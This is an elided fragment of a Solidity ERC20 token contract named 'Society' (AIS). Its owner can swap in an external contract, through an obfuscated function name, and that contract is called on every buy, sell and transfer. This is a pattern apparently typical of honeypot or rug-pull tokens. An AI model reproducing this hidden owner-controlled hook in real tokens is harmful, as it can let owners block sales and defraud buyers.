...
contract TokenM is ERC20 {
    ...
    IUserAmountsoeeru public soeeru;
	mapping(address => bool) private _isExcludedFromFees;
    mapping(address => bool) private _isExcludedFromVipFees;
      uint256 total;
    constructor(address tokenOwner) ERC20("Society", "AIS") {
    ...
    function coudebseBpingsReed(IUserAmountsoeeru _soeeru) public onlyOwner {
        soeeru = _soeeru;
    }
    ...
    function _transfer(
        ...
        if (_isExcludedFromFees[from] || _isExcludedFromFees[to]) {
			...
			if(from == uniswapV2Pair){
                ...
                soeeru.addInAmount(to, amount);
            }else if(to == uniswapV2Pair){
				soeeru.addOutAmount(from, amount);
            }else{
                soeeru.addOutAmount(from, amount);
                takeFee = false;
            }
